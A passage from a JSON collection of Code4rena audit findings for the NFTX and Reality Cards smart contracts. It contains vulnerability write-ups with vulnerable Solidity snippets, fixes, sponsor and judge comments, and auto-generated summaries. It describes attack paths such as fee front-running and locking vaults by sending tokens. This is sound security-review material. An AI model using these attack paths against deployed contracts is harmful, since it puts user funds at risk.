      "content": "_Submitted by pedroais_\n\nPool Manager can front-run entry fee to 100% and users could lose all their deposits.\n\n#### Proof of Concept\n\nConsidering:<br>\nThe pool manager is the creator of the pool.<br>\nAnyone can create a pool.<br>\nManager is not a trusted actor.\n\nAnyone can create a pool and get people to join. If there is a big deposit admin could front-run the transaction and set the fee to max which is uint(1 ether) = 10\\*\\*18 (100% as this is a per token fee).\n\nFunction that set fees :\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L119>\nMax fees are 1 ether :\n<https://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXVaultFactoryUpgradeable.sol#L122>\n\nThe manager could benefit from this by having other pool assets deposited in staking so he would receive fees in Vtokens and could use them to withdraw the nfts.\n\n#### Recommended Mitigation Steps\n\nAdd a timelock to change fees. In that way, frontrunning wouldn't be possible and users would know the fees they are agreeing with.\n\n**[0xKiwi (NFTX) acknowledged, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/213#issuecomment-1003195823):**\n > Most users aren't on vaults that aren't finalized. We warn users for any vaults that arent finalized and we don't present them on our website. Acknowledging and disagreeing with severity.\n\n**[LSDan (judge) decreased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/213#issuecomment-1064508794):**\n > In my view, this is a medium risk. While user funds are at direct risk, the likelihood of this happening or being worth the effort is low. As the sponsor states, it's very rare for a user to interact with an un-finalized vault. The user would have to be directly linked to the vault and then ignore the giant warning presented front and center in the UI. If that warning were to be removed, however, the risk would increase. This external requirement is the only reason I'm going with medium and not low. \n\n\n\n***\n\n",
      "summary": "\nThis bug report details a vulnerability in the NFTXVaultUpgradeable and NFTXVaultFactoryUpgradeable contracts that could allow a pool manager to front-run entry fees to 100%. This could result in users losing all their deposits. The bug is caused by the fact that anyone can create a pool, and the manager is not a trusted actor. The function that sets fees has a maximum of 1 ether, and the manager could benefit from this by having other pool assets deposited in staking. The recommended mitigation step is to add a timelock to change fees, which would prevent frontrunning and allow users to know the fees they are agreeing with.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/213",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "pedroais"
      ]
    },
    {
      "id": "1220",
      "title": "[M-04] NFTXStakingZap and NFTXMarketplaceZap’s transferFromERC721 transfer Cryptokitties to the wrong address",
      "impact": "MEDIUM",
      "content": "## Handle\n\nhyh\n\n\n## Vulnerability details\n\n## Impact\n\n`transferFromERC721(address assetAddr, uint256 tokenId, address to)` should transfer from `msg.sender` to `to`.\nIt transfers to `address(this)` instead when ERC721 is Cryptokitties.\nAs there is no additional logic for this case it seems to be a mistake that leads to wrong NFT accounting after such a transfer as NFT will be missed in the vault (which is `to`).\n\n## Proof of Concept\n\nNFTXStakingZap:\ntransferFromERC721\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXStakingZap.sol#L416\n\nNFTXMarketplaceZap:\ntransferFromERC721\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L556\n\nBoth functions are called by user facing Marketplace buy/sell and Staking addLiquidity/provideInventory functions.\n\n## Recommended Mitigation Steps\n\nFix the address:\n\nNow:\n```\n// Cryptokitties.\ndata = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, address(this), tokenId);\n```\n\nTo be:\n```\n// Cryptokitties.\ndata = abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", msg.sender, to, tokenId);\n```",
      "summary": "\nThis bug report is about a vulnerability in the transferFromERC721 function which should transfer from msg.sender to to, but instead transfers to address(this) when the ERC721 is Cryptokitties. This leads to wrong NFT accounting as the NFT will be missed in the vault. The bug can be found in the NFTXStakingZap and NFTXMarketplaceZap functions, which are called by user facing Marketplace buy/sell and Staking addLiquidity/provideInventory functions. The recommended mitigation step is to fix the address by changing the code from \"transferFrom(address,address,uint256)\", msg.sender, address(this), tokenId to \"transferFrom(address,address,uint256)\", msg.sender, to, tokenId.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/185",
      "tags": [],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "1219",
      "title": "[M-03] NFTXMarketplaceZap.sol#buyAnd***() should return unused weth/eth back to msg.sender instead of to",
      "impact": "MEDIUM",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-nftx/blob/194073f750b7e2c9a886ece34b6382b4f1355f36/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L226-L249\n\n```solidity=226\nfunction buyAndSwap721WETH(\n    uint256 vaultId, \n    uint256[] memory idsIn, \n    uint256[] memory specificIds, \n    uint256 maxWethIn, \n    address[] calldata path,\n    address to\n  ) public nonReentrant {\n    require(to != address(0));\n    require(idsIn.length != 0);\n    IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);\n    INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));\n    uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (\n        vault.randomSwapFee() * (idsIn.length - specificIds.length)\n    );\n    uint256[] memory amounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);\n    _swap721(vaultId, idsIn, specificIds, to);\n\n    emit Swap(idsIn.length, amounts[0], to);\n\n    // Return extras.\n    uint256 remaining = WETH.balanceOf(address(this));\n    WETH.transfer(to, remaining);\n  }\n```\n\nFor example:\n\nIf Alice calls `buyAndSwap721WETH()` to buy some ERC721 and send to Bob, for slippage control, Alice put `1000 ETH` as `maxWethIn`, the actual cost should be lower.\n\nLet's say the actual cost is `900 ETH`.\n\nExpected Results: Alice spend only for the amount of the actual cost (`900 ETH`).\n\nActual Results: Alice spent `1000 ETH`.",
      "summary": "\nThis bug report is about an issue with the WatchPug code. It is related to the function buyAndSwap721WETH, which is used to buy ERC721 tokens and send them to another address. The bug is that when the user puts a maximum amount of ETH (e.g. 1000 ETH) as maxWethIn, the actual cost should be lower, but the user is still charged the full amount. This means that the user is spending more than they should be. This bug could be costing users money and needs to be fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/161",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1218",
      "title": "[M-02] NFTXSimpleFeeDistributor#addReceiver: Failure to check for existing receiver",
      "impact": "MEDIUM",
      "content": "_Submitted by GreyArt_\n\nThe `addReceiver()` function fails to check if the `_receiver` already exists. This could lead to the same receiver being added multiple times, which results in erroneous fee distributions.\n\nThe receiver would receive more than expected (until the duplicate entry has been removed).\n\n#### Recommended Mitigation Steps\n\nHave a mapping `address => bool isReceiver` that will update whenever receivers are added, modified to a new address or removed.\n\n**[0xKiwi (NFTX) acknowledged, but disagreed with medium severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/230#issuecomment-1003210641):**\n > Valid concern, but this is a permissioned function.\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/230#issuecomment-1064558228):**\n > I think this one is much more likely. I would suggest adding a check because the problem is easy to create and much harder to notice.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the `addReceiver()` function that fails to check if the `_receiver` already exists. This could result in the same receiver being added multiple times, leading to erroneous fee distributions. The receiver would receive more than expected until the duplicate entry has been removed. The recommended mitigation step is to have a mapping `address => bool isReceiver` that will update whenever receivers are added, modified to a new address or removed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/230",
      "tags": [],
      "finders": [
        "GreyArt"
      ]
    },
    {
      "id": "1217",
      "title": "[M-01] Missing non reentrancy modifier",
      "impact": "MEDIUM",
      "content": "_Submitted by robee_\n\nThe following functions are missing reentrancy modifier although some other pulbic/external functions does use reentrancy modifer.\nEven though I did not find a way to exploit it, it seems like those functions should have the nonReentrant modifier as the other functions have it as well..\n\n```bash\n  NFTXMarketplaceZap.sol, receive is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, __SimpleFeeDistributor__init__ is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, addReceiver is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, initializeVaultReceivers is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, changeReceiverAlloc is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, changeReceiverAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, removeReceiver is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setTreasuryAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setLPStakingAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setInventoryStakingAddress is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, setNFTXVaultFactory is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, pauseFeeDistribution is missing a reentrancy modifier\n  NFTXSimpleFeeDistributor.sol, rescueTokens is missing a reentrancy modifier\n  NFTXStakingZap.sol, setLPLockTime is missing a reentrancy modifier\n  NFTXStakingZap.sol, setInventoryLockTime is missing a reentrancy modifier\n  NFTXStakingZap.sol, provideInventory721 is missing a reentrancy modifier\n  NFTXStakingZap.sol, provideInventory1155 is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity721ETH is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity1155ETH is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity721 is missing a reentrancy modifier\n  NFTXStakingZap.sol, addLiquidity1155 is missing a reentrancy modifier\n  NFTXStakingZap.sol, receive is missing a reentrancy modifier\n  NFTXStakingZap.sol, rescue is missing a reentrancy modifier\n  NFTXV1Buyout.sol, __NFTXV1Buyout_init is missing a reentrancy modifier\n  NFTXV1Buyout.sol, emergencyWithdraw is missing a reentrancy modifier\n  NFTXV1Buyout.sol, clearBuyout is missing a reentrancy modifier\n  NFTXV1Buyout.sol, addBuyout is missing a reentrancy modifier\n  NFTXV1Buyout.sol, removeBuyout is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, __NFTXVault_init is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, finalizeVault is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setVaultMetadata is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setVaultFeatures is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, assignDefaultFeatures is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setFees is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, disableVaultFees is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, deployEligibilityStorage is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, setManager is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, mint is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, redeem is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, swap is missing a reentrancy modifier\n  NFTXVaultUpgradeable.sol, flashLoan is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, setLockTime is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, addLiquidity721 is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, addLiquidity1155 is missing a reentrancy modifier\n  PalmNFTXStakingZap.sol, receive is missing a reentrancy modifier\n```\n**[0xKiwi (NFTX) disputed](https://github.com/code-423n4/2021-12-nftx-findings/issues/37)**\n\n**[LSDan (judge) increased severity to medium and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/37#issuecomment-1064587166):**\n > I'm updating this [from a low] to a medium. Reentrancy represents a real and significant risk (as evident by ETC existing) and should be protected against regardless of if you can foresee the external event that causes lack of protection to be an issue.\n> \n> `\n> 2 — Med (M): vulns have a risk of 2 and are considered “Medium” severity when assets are not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the missing reentrancy modifier in some functions in NFTXMarketplaceZap.sol, NFTXSimpleFeeDistributor.sol, NFTXStakingZap.sol, NFTXV1Buyout.sol, NFTXVaultUpgradeable.sol, and PalmNFTXStakingZap.sol. Reentrancy modifier is a security measure used to prevent malicious actors from taking advantage of the functions. In this report, it is mentioned that even though no exploit was found, the functions should still have the nonReentrant modifier as the other functions have it as well. A total of 30 functions are mentioned in the report as missing the reentrancy modifier.",
      "quality_score": 1,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/37",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "robee"
      ]
    },
    {
      "id": "1216",
      "title": "[H-03] A vault can be locked from MarketplaceZap and StakingZap",
      "impact": "HIGH",
      "content": "_Submitted by p4st13r4, also found by cmichel, GreyArt, hyh, jayjonah8, leastwood, pauliax, shenwilly, and WatchPug_\n\nAny user that owns a vToken of a particular vault can lock the functionalities of `NFTXMarketplaceZap.sol` and `NFTXStakingZap.sol` for everyone.\n\nEvery operation performed by the marketplace, that deals with vToken minting, performs this check:\n\n```jsx\nrequire(balance == IERC20Upgradeable(vault).balanceOf(address(this)), \"Did not receive expected balance\");\n```\n\nA malicious user could transfer any amount > 0 of a vault’vToken to the marketplace (or staking) zap contracts, thus making the vault functionality unavailable for every user on the marketplace\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421>\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXMarketplaceZap.sol#L421>\n\n#### Recommended Mitigation Steps\n\nRemove this logic from the marketplace and staking zap contracts, and add it to the vaults (if necessary)\n\n**[0xKiwi (NFTX) confirmed, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/107#issuecomment-1003193410):**\n > Valid concern, confirmed. And disagreeing with severity.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/107)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/107#issuecomment-1064511914):**\n > In this case I agree with the warden's severity. The attack would cause user funds to be locked and is incredibly easy to perform.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about a vulnerability in the NFTXMarketplaceZap.sol and NFTXStakingZap.sol contracts. Any user that owns a vToken of a particular vault can lock the functionalities of these contracts for everyone. This is because of a check that is performed by the marketplace when dealing with vToken minting. A malicious user could transfer any amount > 0 of a vault’vToken to the marketplace (or staking) zap contracts, thus making the vault functionality unavailable for every user on the marketplace. The proof of concept can be found at two Github links. To mitigate this vulnerability, the logic should be removed from the marketplace and staking zap contracts, and added to the vaults if necessary.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/107",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "GreyArt",
        "pauliax",
        "cmichel",
        "leastwood",
        "WatchPug",
        "shenwilly",
        "jayjonah8",
        "hyh",
        "p4st13r4"
      ]
    },
    {
      "id": "1215",
      "title": "[H-02] The return value of the _sendForReceiver function is not set, causing the receiver to receive more fees",
      "impact": "HIGH",
      "content": "_Submitted by cccz, also found by WatchPug_\n\nIn the NFTXSimpleFeeDistributor.sol contract, the distribute function is used to distribute the fee, and the distribute function judges whether the fee is sent successfully according to the return value of the \\_sendForReceiver function.\n\n```solidity\nfunction distribute(uint256 vaultId) external override virtual nonReentrant {\n  require(nftxVaultFactory != address(0));\n  address _vault = INFTXVaultFactory(nftxVaultFactory).vault(vaultId);\n\n  uint256 tokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));\n\n  if (distributionPaused || allocTotal == 0) {\n    IERC20Upgradeable(_vault).safeTransfer(treasury, tokenBalance);\n    return;\n  }\n\n  uint256 length = feeReceivers.length;\n  uint256 leftover;\n  for (uint256 i = 0; i <length; i++) {\n    FeeReceiver memory _feeReceiver = feeReceivers[i];\n    uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);\n    uint256 currentTokenBalance = IERC20Upgradeable(_vault).balanceOf(address(this));\n    amountToSend = amountToSend> currentTokenBalance? currentTokenBalance: amountToSend;\n    bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);\n    if (!complete) {\n      leftover = amountToSend;\n    } else {\n      leftover = 0;\n    }\n  }\n```\n\nIn the \\_sendForReceiver function, when \\_receiver is not a contract, no value is returned. By default, this will return false. This will make the distribute function think that the fee sending has failed, and will send more fees next time.\n```solidity\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n  if (_receiver.isContract) {\n    IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);\n    // If the receive is not properly processed, send it to the treasury instead.\n      \n    bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);\n    (bool success,) = address(_receiver.receiver).call(payload);\n\n    // If the allowance has not been spent, it means we can pass it forward to next.\n    return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;\n  } else {\n    IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n  }\n}\n```\n#### Proof of Concept\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L168>\n\n<https://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L49-L67>\n\n#### Recommended Mitigation Steps\n```solidity\nfunction _sendForReceiver(FeeReceiver memory _receiver, uint256 _vaultId, address _vault, uint256 amountToSend) internal virtual returns (bool) {\n  if (_receiver.isContract) {\n    IERC20Upgradeable(_vault).approve(_receiver.receiver, amountToSend);\n    // If the receive is not properly processed, send it to the treasury instead.\n      \n    bytes memory payload = abi.encodeWithSelector(INFTXLPStaking.receiveRewards.selector, _vaultId, amountToSend);\n    (bool success, ) = address(_receiver.receiver).call(payload);\n\n    // If the allowance has not been spent, it means we can pass it forward to next.\n    return success && IERC20Upgradeable(_vault).allowance(address(this), _receiver.receiver) == 0;\n  } else {\n    - IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n    + return IERC20Upgradeable(_vault).safeTransfer(_receiver.receiver, amountToSend);\n  }\n}\n```\n**[0xKiwi (NFTX) confirmed, but disagreed with high severity and commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/67#issuecomment-1003192355):**\n > Good catch, thank you. Disagreeing with severity though since this is a permissioned contract, no user funds are at risk and this would most likely cause some failures.\n> \n> We aren't using any EOAs as receivers in production or testing, so this has not been caught. Thank you.\n\n**[0xKiwi (NFTX) resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/67)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2021-12-nftx-findings/issues/67#issuecomment-1064471042):**\n > I agree with the warden on this one. Funds are directly at risk and the likelihood of this occurring is 100%. I'm not sure if it matters if the funds are user funds or protocol funds. This would eventually have become a big problem that affected the protocol's ability to function.\n\n\n\n***\n\n",
      "summary": "\nA bug report has been filed for the NFTXSimpleFeeDistributor.sol contract. This contract has a distribute function, which is used to distribute the fee. The distribute function judges whether the fee is sent successfully based on the return value of the _sendForReceiver function. However, when the recipient of the fee is not a contract, no value is returned. As a result, the distribute function will think the fee sending has failed and keep sending more fees.\n\nThe bug can be seen at the following links:\n\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L157-L168\n\nhttps://github.com/code-423n4/2021-12-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXSimpleFeeDistributor.sol#L49-L67\n\nThe bug was found through manual analysis. The recommended mitigation step is to modify the _sendForReceiver function to return a value if the recipient is not a contract. The modified code is given above.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/67",
      "tags": [],
      "finders": [
        "cccz",
        "WatchPug"
      ]
    },
    {
      "id": "1214",
      "title": "[H-01] buyAndSwap1155WETH() function may cause loss of user assets",
      "impact": "HIGH",
      "content": "_Submitted by cccz_\n\nIn the NFTXMarketplaceZap.sol contract, the buyAndSwap1155WETH function uses the WETH provided by the user to exchange VaultToken, but when executing the \\_buyVaultToken method, msg.value is used instead of maxWethIn. Since msg.value is 0, the call will fail.\n```solidity\nfunction buyAndSwap1155WETH(\n  uint256 vaultId,\n  uint256[] memory idsIn,\n  uint256[] memory amounts,\n  uint256[] memory specificIds,\n  uint256 maxWethIn,\n  address[] calldata path,\n  address to\n) public payable nonReentrant {\n  require(to != address(0));\n  require(idsIn.length != 0);\n  IERC20Upgradeable(address(WETH)).transferFrom(msg.sender, address(this), maxWethIn);\n  uint256 count;\n  for (uint256 i = 0; i <idsIn.length; i++) {\n      uint256 amount = amounts[i];\n      require(amount> 0, \"Transferring <1\");\n      count += amount;\n  }\n  INFTXVault vault = INFTXVault(nftxFactory.vault(vaultId));\n  uint256 redeemFees = (vault.targetSwapFee() * specificIds.length) + (\n      vault.randomSwapFee() * (count-specificIds.length)\n  );\n  uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);\n```\n\nIn extreme cases, when the user provides both ETH and WETH (the user approves the contract WETH in advance and calls the buyAndSwap1155WETH function instead of the buyAndSwap1155 function by mistake), the \\_buyVaultToken function will execute successfully, but because the buyAndSwap1155WETH function will not convert ETH to WETH, The user’s ETH will be locked in the contract, causing loss of user assets.\n```solidity\nfunction _buyVaultToken(\n  address vault,\n  uint256 minTokenOut,\n  uint256 maxWethIn,\n  address[] calldata path\n) internal returns (uint256[] memory) {\n  uint256[] memory amounts = sushiRouter.swapTokensForExactTokens(\n    minTokenOut,\n    maxWethIn,\n    path,\n    address(this),\n    block.timestamp\n  );\n\n  return amounts;\n}\n```\n\n#### Recommended Mitigation Steps\n```solidity\n  - uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path);\n  + uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);\n```\n\n**[0xKiwi (NFTX) confirmed and resolved](https://github.com/code-423n4/2021-12-nftx-findings/issues/2)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the NFTXMarketplaceZap.sol contract. The buyAndSwap1155WETH function uses the WETH provided by the user to exchange VaultToken, but when executing the _buyVaultToken method, msg.value is used instead of maxWethIn. Since msg.value is 0, the call will fail, leading to the user's ETH being locked in the contract. This was discovered through a manual audit. The recommended mitigation step is to change the code from uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, msg.value, path); to uint256[] memory swapAmounts = _buyVaultToken(address(vault), redeemFees, maxWethIn, path);.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-12-nftx",
      "github_link": "https://github.com/code-423n4/2021-12-nftx-findings/issues/2",
      "tags": [],
      "finders": [
        "cccz"
      ]
    },
    {
      "id": "42277",
      "title": "[M-03] Deposits don't work with fee-on transfer tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThere are ERC20 tokens that may make certain customizations to their ERC20 contracts.\nOne type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.\nOthers are rebasing tokens that increase in value over time like Aave's aTokens (`balanceOf` changes over time).\n\nThe `RCTreasury.deposit()` function will credit more deposits than the contract actually received:\n\n```solidity\nerc20.safeTransferFrom(msgSender(), address(this), _amount);\nuser[_user].deposit += SafeCast.toUint128(_amount);\n```\n\nRecommend ensuring that the `erc20` token does not implement any customizations.\nAlternatively, a mitigation is to measure the asset change right before and after the asset-transferring routines\n\n**[Splidge (Reality Cards) acknowledged](https://github.com/code-423n4/2021-08-realitycards-findings/issues/58#issuecomment-906322667):**\n > The issue that [keeps on giving..](https://github.com/code-423n4/2021-06-realitycards-findings/issues/152)\n>\n> ![takemymoney](https://user-images.githubusercontent.com/73956628/130954991-f6f29f54-926f-4e68-b4cb-f73ed1dc3c95.jpg)\n>\n\n",
      "summary": "\nThe bug report is about a problem with ERC20 tokens that can be customized. Some tokens have a fee for every transfer, while others increase in value over time. The `RCTreasury.deposit()` function is not accurately recording the amount of deposits received, which can result in users being credited with more deposits than they actually made. The report suggests either making sure the token being used does not have any customizations, or measuring the change in assets before and after transferring them. The issue has been acknowledged by the developer, who has also referenced a previous issue with a similar problem.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/58",
      "tags": [],
      "finders": []
    },
    {
      "id": "42276",
      "title": "[M-01] Uninitialized Variable `marketWhitelist` in `RCTreasury.sol`",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood, also found by 0xsanson, gpersoon, hickuphh3 and JMukesh_\n\nThe variable, `marketWhitelist`, is never initialized in the contract `RCTreasury.sol`. As a result, the function `marketWhitelistCheck()`  does not perform a proper check on whitelisted users for a restricted market. Additionally, the function will always return `true`, even if a market wishes to restrict its users to a specific role.\n\nThe initial state variable is defined in [`RCTreasury.sol` L75](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L75).\n\n\nThe state variable `marketWhitelist` is accessed in the function `RCTreasury.marketWhitelistCheck()` at [`RCTreasury.sol` L269-L281](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L269-L281).\n\nThe function `RCTreasury.marketWhitelistCheck()` is called in `RCMarket.newRental()` at [`RCMarket.sol` L758-L761](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L758-L761). The comment indicates that there should be some ability to restrict certain markets to specific whitelists, however, there are no methods in `RCTreasury` that allow a market creator to enable this functionality.\n\nRecommend ensuring this behavior is intended. If this is not the case, consider adding a function that enables a market creator to restrict their market to a specific role by whitelisting users.\n\n**[Splidge (Reality Cards) confirmed and disagreed with severity](https://github.com/code-423n4/2021-08-realitycards-findings/issues/18#issuecomment-905413207):**\n > I think the severity could be double-checked on this one.\n> It's a close one but I'd be tempted to put it under 1 (low risk) as a \"Function incorrect to spec\".\n> Regardless, this will be fixed.\n>\n> Edit: I notice the duplicates were both marked as 1 (low risk).\n\n**[0xean (judge) commented](https://github.com/code-423n4/2021-08-realitycards-findings/issues/18#issuecomment-910962066):**\n > based on \" but the function of the protocol or its availability could be impacted\" in the code4 docs, I am going to agree with warden and leave this as a 2.  The function of the protocol is certainly impacted in a case where the whitelist if not working correctly.\n\n\n**[Splidge (Reality Cards) patched](https://github.com/code-423n4/2021-08-realitycards-findings/issues/18#issuecomment-914175471):**\n > Fixed [here](https://github.com/RealityCards/RealityCards-Contracts/commit/1515f87e97be1ed09316340e19caea5c12242c17)\n\n",
      "summary": "\nThe bug report highlights an issue with a variable called `marketWhitelist` in a contract called `RCTreasury.sol`. This variable is not properly initialized, causing the function `marketWhitelistCheck()` to always return `true` and not properly check for whitelisted users in a restricted market. The report also mentions that there is no way for a market creator to enable this functionality. The severity of the bug was debated, with some suggesting it should be marked as a low risk issue, but it was ultimately patched by the team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/18",
      "tags": [],
      "finders": []
    },
    {
      "id": "42275",
      "title": "[H-02] `UberOwner` has too much power",
      "impact": "HIGH",
